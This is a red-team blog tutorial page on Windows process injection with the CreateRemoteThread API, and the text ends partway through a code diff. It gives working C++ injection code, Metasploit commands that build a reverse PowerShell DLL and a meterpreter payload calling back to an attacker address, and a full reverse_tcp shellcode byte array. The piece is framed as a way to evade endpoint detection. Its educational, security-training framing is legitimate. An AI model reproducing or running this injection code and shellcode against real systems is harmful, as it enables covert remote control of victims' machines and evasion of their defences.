<!DOCTYPE html>
<html lang="en" class="auto-color">
<head>

    <title>Process Injection using CreateRemoteThread API</title>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="HandheldFriendly" content="True" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    
    <link rel="preload" as="style" href="/assets/built/screen.css?v=ffa7c93e5d" />
    <link rel="preload" as="script" href="/assets/built/casper.js?v=ffa7c93e5d" />

    <link rel="stylesheet" type="text/css" href="/assets/built/screen.css?v=ffa7c93e5d" />

    <meta name="description" content="CreateRemoteThread is the oldest method of process injection, and it is easily detectable. However, this establishes the foundations for process injection and code execution. This blog post will provide you with a thorough and practical explanation of how it works.">
    <link rel="canonical" href="https://tbhaxor.com/createremotethread-process-injection/">
    <meta name="referrer" content="no-referrer-when-downgrade">
    <link rel="amphtml" href="https://tbhaxor.com/createremotethread-process-injection/amp/">
    
    <meta property="og:site_name" content="tbhaxor&#x27;s Blog">
    <meta property="og:type" content="article">
    <meta property="og:title" content="Process Injection using CreateRemoteThread API">
    <meta property="og:description" content="CreateRemoteThread is the oldest method of process injection, and it is easily detectable. However, this establishes the foundations for process injection and code execution. This blog post will provide you with a thorough and practical explanation of how it works.">
    <meta property="og:url" content="https://tbhaxor.com/createremotethread-process-injection/">
    <meta property="og:image" content="https://images.unsplash.com/photo-1648977526715-0d99e6b21036?crop&#x3D;entropy&amp;cs&#x3D;tinysrgb&amp;fit&#x3D;max&amp;fm&#x3D;jpg&amp;ixid&#x3D;MnwxMTc3M3wwfDF8YWxsfDUzfHx8fHx8Mnx8MTY0OTA0MzIzOA&amp;ixlib&#x3D;rb-1.2.1&amp;q&#x3D;80&amp;w&#x3D;2000">
    <meta property="article:published_time" content="2022-04-11T08:30:00.000Z">
    <meta property="article:modified_time" content="2022-04-11T08:53:04.000Z">
    <meta property="article:tag" content="windows">
    <meta property="article:tag" content="exploitation">
    <meta property="article:tag" content="process-injection">
    
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:title" content="Process Injection using CreateRemoteThread API">
    <meta name="twitter:description" content="CreateRemoteThread is the oldest method of process injection, and it is easily detectable. However, this establishes the foundations for process injection and code execution. This blog post will provide you with a thorough and practical explanation of how it works.">
    <meta name="twitter:url" content="https://tbhaxor.com/createremotethread-process-injection/">
    <meta name="twitter:image" content="https://images.unsplash.com/photo-1648977526715-0d99e6b21036?crop&#x3D;entropy&amp;cs&#x3D;tinysrgb&amp;fit&#x3D;max&amp;fm&#x3D;jpg&amp;ixid&#x3D;MnwxMTc3M3wwfDF8YWxsfDUzfHx8fHx8Mnx8MTY0OTA0MzIzOA&amp;ixlib&#x3D;rb-1.2.1&amp;q&#x3D;80&amp;w&#x3D;2000">
    <meta name="twitter:label1" content="Written by">
    <meta name="twitter:data1" content="Gurkirat Singh">
    <meta name="twitter:label2" content="Filed under">
    <meta name="twitter:data2" content="windows, exploitation, process-injection">
    <meta name="twitter:site" content="@tbhaxor">
    <meta name="twitter:creator" content="@tbhaxor">
    <meta property="og:image:width" content="1200">
    <meta property="og:image:height" content="675">
    
    <script type="application/ld+json">
{
    "@context": "https://schema.org",
    "@type": "Article",
    "publisher": {
        "@type": "Organization",
        "name": "tbhaxor&#x27;s Blog",
        "url": "https://tbhaxor.com/",
        "logo": {
            "@type": "ImageObject",
            "url": "https://tbhaxor.com/favicon.ico",
            "width": 48,
            "height": 48
        }
    },
    "author": {
        "@type": "Person",
        "name": "Gurkirat Singh",
        "image": {
            "@type": "ImageObject",
            "url": "https://tbhaxor.com/content/images/2021/07/28386721.png",
            "width": 400,
            "height": 400
        },
        "url": "https://tbhaxor.com/author/tbhaxor/",
        "sameAs": [
            "https://tbhaxor.com",
            "https://twitter.com/tbhaxor"
        ]
    },
    "headline": "Process Injection using CreateRemoteThread API",
    "url": "https://tbhaxor.com/createremotethread-process-injection/",
    "datePublished": "2022-04-11T08:30:00.000Z",
    "dateModified": "2022-04-11T08:53:04.000Z",
    "image": {
        "@type": "ImageObject",
        "url": "https://images.unsplash.com/photo-1648977526715-0d99e6b21036?crop=entropy&cs=tinysrgb&fit=max&fm=jpg&ixid=MnwxMTc3M3wwfDF8YWxsfDUzfHx8fHx8Mnx8MTY0OTA0MzIzOA&ixlib=rb-1.2.1&q=80&w=2000",
        "width": 1200,
        "height": 675
    },
    "keywords": "windows, exploitation, process-injection",
    "description": "CreateRemoteThread is the oldest method of process injection, and it is easily detectable. However, this establishes the foundations for process injection and code execution. This blog post will provide you with a thorough and practical explanation of how it works.",
    "mainEntityOfPage": "https://tbhaxor.com/createremotethread-process-injection/"
}
    </script>

    <meta name="generator" content="Ghost 5.97">
    <link rel="alternate" type="application/rss+xml" title="tbhaxor&#x27;s Blog" href="https://tbhaxor.com/rss/">
    
    <script defer src="https://cdn.jsdelivr.net/ghost/sodo-search@~1.3/umd/sodo-search.min.js" data-key="a0ab0aca513a28cba845f4f27e" data-styles="https://cdn.jsdelivr.net/ghost/sodo-search@~1.3/umd/main.css" data-sodo-search="https://tbhaxor.com/" data-locale="en" crossorigin="anonymous" type="f971b3148f537f1d2a2bff49-text/javascript"></script>
    
    <link href="https://tbhaxor.com/webmentions/receive/" rel="webmention">
    <script defer src="/public/cards.min.js?v=ffa7c93e5d" type="f971b3148f537f1d2a2bff49-text/javascript"></script><style>:root {--ghost-accent-color: #151719;}</style>
    <link rel="stylesheet" type="text/css" href="/public/cards.min.css?v=ffa7c93e5d">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/PrismJS/prism-themes/themes/prism-vsc-dark-plus.css">
<link rel="stylesheet" href="https://unpkg.com/prismjs@1.27.0/plugins/diff-highlight/prism-diff-highlight.min.css">
<link rel="stylesheet" href="https://unpkg.com/prismjs@1.27.0/plugins/line-highlight/prism-line-highlight.min.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.11.1/tocbot.css">
<script defer src="//unpkg.com/prismjs/plugins/line-highlight/prism-line-highlight.min.js" type="f971b3148f537f1d2a2bff49-text/javascript"></script>
<script type="f971b3148f537f1d2a2bff49-text/javascript">(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
})(window,document,'script','dataLayer','GTM-57CDLG8');</script>
<style>
    figure {
      margin-top: 2vmin !important;
    }
  
    .kg-image-card {
        grid-column: main-start/main-end !important;
    }

    .gh-toc > .toc-list,
    .left-align {
        position: relative;
        overflow: hidden;
    }

    .gh-toc .toc-list {
        list-style: none;
        padding-left: 18px;
    }

    .gh-toc .toc-list li {
        padding-left: 0px;
    }

    .gh-toc .is-active-link::before {
        background-color: var(--ghost-accent-color); /* Defines TOC accent color based on Accent color set in Ghost Admin */
    }
    .gh-toc .toc-link::before {
        background-color: #3f3f3f;
    }

    .gh-toc .is-active-link::before {
        background-color: #ffffff;
    }
   
    .gh-head-menu {
        justify-content: center !important;
    }
    .gh-content p {
        text-align: justify !important;
    }

    .gh-canvas {
        display: grid;
        position: relative;
        grid-template-columns: [full-start] minmax(4vmin, auto) [wide-start] minmax(auto, 240px) [main-start] min(950px, calc(100% - 8vw)) [main-end] minmax(auto, 240px) [wide-end] minmax(4vmin, auto) [full-end];
    }

    section.article-tag a {
        color: #4bffaa !important;
    }

    ::selection {
        color: white;
        background: #4b4caa;
    }
    pre code {
        font-size: 18px !important;
    }

    @media (min-width: 1300px) {
        .gh-toc {
            position: absolute;
            height: 100%;
            grid-column: wide-start / main-start; /* Place the TOC to the left of the content */
        }
        .gh-toc > .toc-list {
            position: sticky; /* On larger screens, TOC will stay in the same spot on the page */
            top: 2vmin;
        }
    }
    .gh-content table:not(.gist table) td {
        white-space: pre-wrap;
    }
    .gh-content table:not(.gist table) th {
        text-align: center !important;
    }

    .gh-canvas .article-image {
        grid-column: main-start/main-end;
        margin: max(6.4vmin, 40px) 0 0;
        width: 100%;
        max-height: 400px;
        
        background-attachment: fixed;
  background-position: center;
  background-repeat: no-repeat;
  background-size: cover;
    }
    .gh-canvas .article-image img {
        display: block;
        margin-left: auto;
        margin-right: auto;
        width: 100%;
        object-fit: cover;
        height: 100%;
        object-position: center;
        
        background-attachment: fixed;
  background-position: center;
  background-repeat: no-repeat;
  background-size: cover;
    }

    /* Parallax effect for article images */
.article-image {
    position: relative;
    overflow: hidden;
    height: 400px; /* Set the height as needed */
}

.article-image img {
    position: absolute;
    top: 0;
    left: 0;
    width: 100%;
    height: auto;
    min-height: 100%;
    transform: translateY(0);
    transition: transform 0.1s;
    will-change: transform;
</style>


<!-- Katex injection start -->
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/katex.min.css" integrity="sha384-n8MVd4RsNIU0tAv4ct0nTaAbDJwPJzDEaqSD1odI+WdtXRGWt2kTvGFasHpSy3SV" crossorigin="anonymous">
<!-- Katex injection ends -->

</head>
<body class="post-template tag-windows tag-exploitation tag-process-injection is-head-middle-logo has-sans-body has-cover">
<div class="viewport">

    <header id="gh-head" class="gh-head outer">
        <div class="gh-head-inner inner">
            <div class="gh-head-brand">
                <a class="gh-head-logo no-image" href="https://tbhaxor.com">
                        tbhaxor&#x27;s Blog
                </a>
                <button class="gh-search gh-icon-btn" aria-label="Search this site" data-ghost-search><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2" width="20" height="20"><path stroke-linecap="round" stroke-linejoin="round" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"></path></svg></button>
                <button class="gh-burger" aria-label="Main Menu"></button>
            </div>

            <nav class="gh-head-menu">
                <ul class="nav">
    <li class="nav-about-me"><a href="https://tbhaxor.com/about/">About Me</a></li>
    <li class="nav-series"><a href="https://tbhaxor.com/series/">Series</a></li>
    <li class="nav-support-me"><a href="https://tbhaxor.com/contributions-and-support/">Support Me</a></li>
</ul>

            </nav>

            <div class="gh-head-actions">
                        <button class="gh-search gh-icon-btn" aria-label="Search this site" data-ghost-search><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2" width="20" height="20"><path stroke-linecap="round" stroke-linejoin="round" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"></path></svg></button>
            </div>
        </div>
    </header>

    <div class="site-content">
        



<main id="site-main" class="site-main">
<article class="article post tag-windows tag-exploitation tag-process-injection image-small">

    <header class="article-header gh-canvas">

        <div class="article-tag post-card-tags">
                <span class="post-card-primary-tag">
                    <a href="/tag/windows/">windows</a>
                </span>
        </div>

        <h1 class="article-title">Process Injection using CreateRemoteThread API</h1>

            <p class="article-excerpt">CreateRemoteThread is the oldest method of process injection, and it is easily detectable. However, this establishes the foundations for process injection and code execution. This blog post will provide you with a thorough and practical explanation of how it works.</p>

        <div class="article-byline">
        <section class="article-byline-content">

            <ul class="author-list instapaper_ignore">
                <li class="author-list-item">
                    <a href="/author/tbhaxor/" class="author-avatar" aria-label="Read more of Gurkirat Singh">
                        <img class="author-profile-image" src="/content/images/size/w100/2021/07/28386721.png" alt="Gurkirat Singh" />
                    </a>
                </li>
            </ul>

            <div class="article-byline-meta">
                <h4 class="author-name"><a href="/author/tbhaxor/">Gurkirat Singh</a></h4>
                <div class="byline-meta-content">
                    <time class="byline-meta-date" datetime="2022-04-11">Apr 11, 2022</time>
                        <span class="byline-reading-time"><span class="bull">&bull;</span> 11 min read</span>
                </div>
            </div>

        </section>
        </div>

            <figure class="article-image">
                <img
                    srcset="https://images.unsplash.com/photo-1648977526715-0d99e6b21036?crop&#x3D;entropy&amp;cs&#x3D;tinysrgb&amp;fit&#x3D;max&amp;fm&#x3D;jpg&amp;ixid&#x3D;MnwxMTc3M3wwfDF8YWxsfDUzfHx8fHx8Mnx8MTY0OTA0MzIzOA&amp;ixlib&#x3D;rb-1.2.1&amp;q&#x3D;80&amp;w&#x3D;300 300w,
                            https://images.unsplash.com/photo-1648977526715-0d99e6b21036?crop&#x3D;entropy&amp;cs&#x3D;tinysrgb&amp;fit&#x3D;max&amp;fm&#x3D;jpg&amp;ixid&#x3D;MnwxMTc3M3wwfDF8YWxsfDUzfHx8fHx8Mnx8MTY0OTA0MzIzOA&amp;ixlib&#x3D;rb-1.2.1&amp;q&#x3D;80&amp;w&#x3D;600 600w,
                            https://images.unsplash.com/photo-1648977526715-0d99e6b21036?crop&#x3D;entropy&amp;cs&#x3D;tinysrgb&amp;fit&#x3D;max&amp;fm&#x3D;jpg&amp;ixid&#x3D;MnwxMTc3M3wwfDF8YWxsfDUzfHx8fHx8Mnx8MTY0OTA0MzIzOA&amp;ixlib&#x3D;rb-1.2.1&amp;q&#x3D;80&amp;w&#x3D;1000 1000w,
                            https://images.unsplash.com/photo-1648977526715-0d99e6b21036?crop&#x3D;entropy&amp;cs&#x3D;tinysrgb&amp;fit&#x3D;max&amp;fm&#x3D;jpg&amp;ixid&#x3D;MnwxMTc3M3wwfDF8YWxsfDUzfHx8fHx8Mnx8MTY0OTA0MzIzOA&amp;ixlib&#x3D;rb-1.2.1&amp;q&#x3D;80&amp;w&#x3D;2000 2000w"
                    sizes="(min-width: 1400px) 1400px, 92vw"
                    src="https://images.unsplash.com/photo-1648977526715-0d99e6b21036?crop&#x3D;entropy&amp;cs&#x3D;tinysrgb&amp;fit&#x3D;max&amp;fm&#x3D;jpg&amp;ixid&#x3D;MnwxMTc3M3wwfDF8YWxsfDUzfHx8fHx8Mnx8MTY0OTA0MzIzOA&amp;ixlib&#x3D;rb-1.2.1&amp;q&#x3D;80&amp;w&#x3D;2000"
                    alt="Process Injection using CreateRemoteThread API"
                />
                    <figcaption>Photo by <a href="https://unsplash.com/@rootnot?utm_source=ghost&utm_medium=referral&utm_campaign=api-credit">Kirill Root</a> / <a href="https://unsplash.com/?utm_source=ghost&utm_medium=referral&utm_campaign=api-credit">Unsplash</a></figcaption>
            </figure>

    </header>

    <section class="gh-content gh-canvas">
        <p>Hello World! Malware developers work hard to prevent the detection of their code from the endpoint detection systems that use more advanced mechanisms to find suspicious activity on the system. I will be discussing one of the oldest and most easily detectable methods to get started with process injection.</p><p>Process injection is a technique used in offensive security to circumvent the EDR detection by executing the program in the context of another legitimate process like svchost.exe, explorer.exe or any other windows process. Since the malicious code is running in the address space of the different processes it will also inherit all the privileges of the target process and can be used for privilege escalation as well. Read more about address spacing – <a href="https://tbhaxor.com/understanding-address-spacing-in-detail/">https://tbhaxor.com/understanding-address-spacing-in-detail/</a>.</p><figure class="kg-card kg-bookmark-card"><a class="kg-bookmark-container" href="https://github.com/tbhaxor/WinAPI-RedBlue/tree/main/Process%20Injection"><div class="kg-bookmark-content"><div class="kg-bookmark-title">WinAPI-RedBlue/Process Injection at main · tbhaxor/WinAPI-RedBlue</div><div class="kg-bookmark-description">Source code of exploiting windows API for red teaming series - WinAPI-RedBlue/Process Injection at main · tbhaxor/WinAPI-RedBlue</div><div class="kg-bookmark-metadata"><img class="kg-bookmark-icon" src="https://github.com/fluidicon.png" alt=""><span class="kg-bookmark-author">GitHub</span><span class="kg-bookmark-publisher">tbhaxor</span></div></div><div class="kg-bookmark-thumbnail"><img src="https://opengraph.githubassets.com/0b62b22d2ba84de751f5cff377f15830c8d66b49ad176190f2ef63c52f493d5a/tbhaxor/WinAPI-RedBlue" alt=""></div></a></figure><h1 id="understanding-the-theory-behind-this-technique">Understanding the Theory behind this Technique</h1><p>It is very noisy to create a process directly from an image file. Normal users can see it in the task manager and might kill it. The antimalware systems will kill them even before the user notices. To keep the compromise off the radar, the malware developers try to run certain pieces of code in the context of a different process. This is basically called process injection.</p><p>Running the piece of code in the different processes can give you a different set of privileges and access rights on the system and that can be exploited further escalate to gain access to the system's highest privileged user for persistence or circumvent the detection mechanism in order to carry out further in the post-exploitation phase. In this post, I will show you how to execute a meterpreter shellcode in the remote thread and also load the DLL and execute the DllMain function. If you are new to libraries, I would recommend you to read <strong><a href="https://tbhaxor.com/loading-dlls-using-cpp-in-windows/">Loading DLLs using C++ in Windows</a> </strong>and<strong> </strong><a href="https://tbhaxor.com/reading-and-writing-into-processs-memory/"><strong>Reading and Writing into the Process's Memory</strong></a><strong> </strong>before moving forward.</p><p>The attacker processes perform certain steps in order to successfully inject a DLL or a shellcode into another process memory and run a thread in that process containing the execution steps of that shellcode or DLL</p><ol><li>Open the process handle with appropriate permissions</li><li>Write the shellcode or path of DLL into the process memory</li><li>Create the remote thread and provide the address or LoadLibrary function when DLL is selected or the base address of the shellcode in the remote memory</li></ol><div class="kg-card kg-callout-card kg-callout-card-grey"><div class="kg-callout-emoji">💡</div><div class="kg-callout-text">The shellcode is directly executed on the system without passing through the compiler. A shellcode written in x64 syntax can only get executed in the 64-bit system. Similarly, the x86 shellcode will only work in the 32-bit compatible processors. This is because of the limited set of instructions and the address space on the different architectures.</div></div><h1 id="injecting-a-dll-from-disk-into-the-process-memory">Injecting a DLL from Disk into the Process Memory</h1><p>Let's start by opening the process handle with <code>PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_CREATE_THREAD</code> access rights that will allow us to allocate the memory in the remote process and write the contents of the DLL path from the current process address to the remote process address space and later create a thread in the process from the attacker process.</p><figure class="kg-card kg-code-card"><pre><code class="language-c++">HANDLE hProcess = OpenProcess(PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_CREATE_THREAD, FALSE, dwPID);
if (hProcess == NULL) {
  PrintError("OpenProcess()", TRUE);
  return 0x1;
}</code></pre><figcaption>Open the process handle with sufficient access rights for process injection</figcaption></figure><p>You must be thinking about why it is required to have memory allocation and WriteProcessMemory operations in the first place, not just use the data from the current process? Recall, that the process can perform read and write by default to their address space only. The functions we will be using are going to by default look for the addresses in the target process address space. This will be later required by the <code>LoadLibraryA</code> function.</p><p>To write into the process address, you must first allocate a buffer. Let's do this with the <code><strong><a href="https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex">VirtualAllocEx</a></strong></code> function which accepts process handle to specifically perform memory allocation in the remote process. After this, you need to call <code><strong><a href="https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory">WriteProcessMemory</a></strong></code> to copy the DLL path provided as the second CLI argument.</p><figure class="kg-card kg-code-card"><pre><code class="language-c++">LPVOID lpBaseAddress = VirtualAllocEx(hProcess, nullptr, 1 &lt;&lt; 12, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
if (lpBaseAddress == nullptr) {
  PrintError("VirtualAllocEx()", TRUE);
  return 0x0;
}

if (!WriteProcessMemory(hProcess, lpBaseAddress, (LPCVOID) argv[2], strlen(argv[2]), nullptr)) {
  PrintError("WriteProcessMemory()", TRUE);
}</code></pre><figcaption>Allocate a buffer in the remote process and copy the DLL path content</figcaption></figure><p>Now to execute the instructions in the DllMain function of the library, you need to load it with the <a href="https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibrarya"><strong><code>LoadLibrary</code></strong></a> function. The <code><strong><a href="https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread">CreateRemoteThread</a></strong></code> expects an address of the routine and also allows to pass the additional function arguments. Now all you need is the address of the LoadLibrary function.</p><p>The function is defined in the <code>Kernel32</code> library which is luckily mapped to the same starting address of every process while the operating system is still running. So this means that the address  <code>LoadLibraryA</code> in process A is identical to that in process B. The concreate is not documented in the Microsoft documentation but what I and other developers think is that windows have to inject certain DLLs (Kernel32 is one of them) into every process to make the program works. So mapping these DLLs to different addresses for each program will add another overhead to the loader. But this address will be randomized every time Windows is booted because of the Address Space Layout Randomizer.</p><figure class="kg-card kg-code-card"><pre><code class="language-c++">HMODULE hKernel32 = GetModuleHandleA("Kernel32");
if (hKernel32 == NULL) {
  VirtualFreeEx(hProcess, lpBaseAddress, 0x0, MEM_RELEASE);
  lpBaseAddress = nullptr;

  CloseHandle(hProcess);
  hProcess = NULL;

  PrintError("GetModuleHandleA()", TRUE);
  return 0x0;
}
FARPROC pLoadLibraryA = GetProcAddress(hKernel32, "LoadLibraryA");</code></pre><figcaption>Getting the address of the <code><strong><a href="https://docs.microsoft.com/en-us/windows/win32/procthread/fibers">LoadLibraryA</a></strong></code> function from the Kernel32 module</figcaption></figure><p>Now all you need is to call the <a href="https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread"><strong><code>CreateRemoteThread</code></strong></a> function with process handle, address to the <strong>LoadLibraryA</strong> function retrieved from the above snippet and pass the buffer containing the path of the </p><figure class="kg-card kg-code-card"><pre><code class="language-c++">HANDLE hThread = CreateRemoteThread(hProcess, nullptr, NULL, (LPTHREAD_START_ROUTINE) pLoadLibraryA, lpBaseAddress, NULL, nullptr);
if (hThread == NULL) {
  VirtualFreeEx(hProcess, lpBaseAddress, 0x0, MEM_RELEASE);
  lpBaseAddress = nullptr;

  CloseHandle(hProcess);
  hProcess = NULL;

  PrintError("CreateRemoteThread()", TRUE);
  return 0x0;
}

std::cout &lt;&lt; "Injected DLL\n";</code></pre><figcaption>Start the remote thread in the target process to load the DLL using LoadLibraryA</figcaption></figure><h2 id="creating-malicious-dll-via-metasploit">Creating Malicious DLL via Metasploit</h2><p>To make things simpler, let's create the malicious DLL via Metasploit and use that to inject it into the target process. Use the following steps in the Metasploit to create a DLL with reverse TCP PowerShell payload and exit function type "Thread"</p><figure class="kg-card kg-code-card"><pre><code class="language-shell">msf6 &gt; use payload/windows/x64/powershell_reverse_tcp
msf6 payload(windows/x64/powershell_reverse_tcp) &gt; set exitfunc thread 
exitfunc =&gt; thread
msf6 payload(windows/x64/powershell_reverse_tcp) &gt; set lhost 192.168.1.7 
lhost =&gt; 192.168.1.7
msf6 payload(windows/x64/powershell_reverse_tcp) &gt; set lport 4444 
lport =&gt; 4444
msf6 payload(windows/x64/powershell_reverse_tcp) &gt; generate -f dll -o exploit.dll 
[*] Writing 8704 bytes to exploit.dll...</code></pre><figcaption>Generating <code>exploit.dll</code> in the current directory</figcaption></figure><p>The EXITFUNC is basically the cleanup action for the payload which instructs the CPU on the target system to exit gracefully. In this case, I have used <strong>thread</strong> because when the payload execution is no longer needed, it should call the <code><strong><a href="https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-exitthread">ExitThread()</a></strong></code> function instead of <code><a href="https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-exitprocess">ExitProcess()</a></code>, which will terminate only the current thread created by CreateRemoteThread.</p><h2 id="running-the-dll-exploit">Running the DLL Exploit</h2><p>The application you are injecting into will be running in the different context of environment variables or the current working directory. If the DLL is not found in the <a href="https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order">search order</a>, it will fail and the injected one will not execute. You are supposed to pass the absolute path of the DLL so that it gets copied into the target process and loaded regardless of the search order.</p><p>Once the DLL is injected into the target process you can see the modules in the process explorer tool containing the name and path o the</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://tbhaxor.com/content/images/2022/04/image.png" class="kg-image" alt loading="lazy" width="997" height="561" srcset="https://tbhaxor.com/content/images/size/w600/2022/04/image.png 600w, https://tbhaxor.com/content/images/2022/04/image.png 997w" sizes="(min-width: 720px) 720px"><figcaption>The DLL <code>exploit.dll</code> is loaded into the process memory</figcaption></figure><p>You can check out the demonstration of the above code in the following video, where a reverse PowerShell connection on the attacker machine is started as soon as the DLL is injected into the <code><strong>Notepad.exe</strong></code> process.</p><figure class="kg-card kg-embed-card"><iframe src="https://player.vimeo.com/video/696304997?h=2f8f4fa6b8&amp;app_id=122963" width="426" height="240" frameborder="0" allow="autoplay; fullscreen; picture-in-picture" allowfullscreen title="DLL Injection via CreateRemoteThread"></iframe></figure><h1 id="injecting-a-shellcode-into-process-memory">Injecting a Shellcode into Process Memory</h1><p>DLL is loaded from the disk and such operations are even noisier + leave fingerprints on the system which then can be analyzed by the DFIR teams and proactively monitored by the EDR systems. </p><p>So what if we can somehow inject our payload in a more stealthy manner? Well as soon as the program exits, the RAM is then freed and allocated to different processes. So if we can somehow inject the code from memory, it can bypass more detentions and make it stealthier than the DLL trick. </p><p>Remember that shellcode can be directly injected from the memory and executed right away. So let's first have the shellcode ready using meterpreter and then use it in the code</p><figure class="kg-card kg-code-card"><pre><code>msf6 &gt; use payload/windows/x64/meterpreter/reverse_tcp
msf6 payload(windows/x64/meterpreter/reverse_tcp) &gt; set lhost 192.168.1.7 
lhost =&gt; 192.168.1.7
msf6 payload(windows/x64/meterpreter/reverse_tcp) &gt; set exitfunc thread 
exitfunc =&gt; thread
msf6 payload(windows/x64/meterpreter/reverse_tcp) &gt; generate -f c</code></pre><figcaption>Creating Reverse Meterpreter Shellcode from Metasploit</figcaption></figure><p>In my case, I got the following shellcode. It can be different based on your <code>LHOST</code> option value.</p><figure class="kg-card kg-code-card"><pre><code class="language-c++">/*
 * windows/x64/meterpreter/reverse_tcp - 449 bytes (stage 1)
 * https://metasploit.com/
 * VERBOSE=false, LHOST=192.168.1.7, LPORT=4444, 
 * ReverseAllowProxy=false, ReverseListenerThreaded=false, 
 * StagerRetryCount=10, StagerRetryWait=5, PingbackRetries=0, 
 * PingbackSleep=30, PayloadUUIDTracking=false, 
 * EnableStageEncoding=false, StageEncoderSaveRegisters=, 
 * StageEncodingFallback=true, PrependMigrate=false, 
 * EXITFUNC=thread, AutoLoadStdapi=true, 
 * AutoVerifySessionTimeout=30, InitialAutoRunScript=, 
 * AutoRunScript=, AutoSystemInfo=true, 
 * EnableUnicodeEncoding=false, SessionRetryTotal=3600, 
 * SessionRetryWait=10, SessionExpirationTimeout=604800, 
 * SessionCommunicationTimeout=300, PayloadProcessCommandLine=, 
 * AutoUnhookProcess=false
 */
unsigned char buf[] = 
"\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41\x50\x52"
"\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
"\x8b\x52\x20\x48\x8b\x72\x50\x4d\x31\xc9\x48\x0f\xb7\x4a\x4a"
"\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"
"\x01\xd0\x66\x81\x78\x18\x0b\x02\x0f\x85\x72\x00\x00\x00\x8b"
"\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x44\x8b"
"\x40\x20\x50\x49\x01\xd0\x8b\x48\x18\xe3\x56\x4d\x31\xc9\x48"
"\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x48\x31\xc0\xac\x41\xc1"
"\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45"
"\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b"
"\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48"
"\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9"
"\x4b\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33\x32\x00\x00"
"\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00\x00\x49\x89\xe5"
"\x49\xbc\x02\x00\x11\x5c\xc0\xa8\x01\x07\x41\x54\x49\x89\xe4"
"\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x4c\x89\xea\x68"
"\x01\x01\x00\x00\x59\x41\xba\x29\x80\x6b\x00\xff\xd5\x6a\x0a"
"\x41\x5e\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48\xff\xc0\x48\x89"
"\xc2\x48\xff\xc0\x48\x89\xc1\x41\xba\xea\x0f\xdf\xe0\xff\xd5"
"\x48\x89\xc7\x6a\x10\x41\x58\x4c\x89\xe2\x48\x89\xf9\x41\xba"
"\x99\xa5\x74\x61\xff\xd5\x85\xc0\x74\x0c\x49\xff\xce\x75\xe5"
"\x68\xf0\xb5\xa2\x56\xff\xd5\x48\x83\xec\x10\x48\x89\xe2\x4d"
"\x31\xc9\x6a\x04\x41\x58\x48\x89\xf9\x41\xba\x02\xd9\xc8\x5f"
"\xff\xd5\x48\x83\xc4\x20\x5e\x89\xf6\x6a\x40\x41\x59\x68\x00"
"\x10\x00\x00\x41\x58\x48\x89\xf2\x48\x31\xc9\x41\xba\x58\xa4"
"\x53\xe5\xff\xd5\x48\x89\xc3\x49\x89\xc7\x4d\x31\xc9\x49\x89"
"\xf0\x48\x89\xda\x48\x89\xf9\x41\xba\x02\xd9\xc8\x5f\xff\xd5"
"\x48\x01\xc3\x48\x29\xc6\x48\x85\xf6\x75\xe1\x41\xff\xe7";</code></pre><figcaption>Shellcode generated from Metasploit to get a reverse meterpreter shell</figcaption></figure><h2 id="modifying-dll-code-to-support-shellcode">Modifying DLL Code to Support Shellcode</h2><p>The code is almost similar to the codebase of the DLL there are some tweaks to it which you can find in the following diff.</p><pre><code class="language-diff">INT main(INT argc, LPSTR argv[]) {
...
+ BYTE buf[] = {}; // add the shellcode here
- if (argc &lt; 3) {
+ if (argc &lt; 2) {
- std::cerr &lt;&lt; "Usage: " &lt;&lt; argv[0] &lt;&lt; " PID /path/to/dll\n";
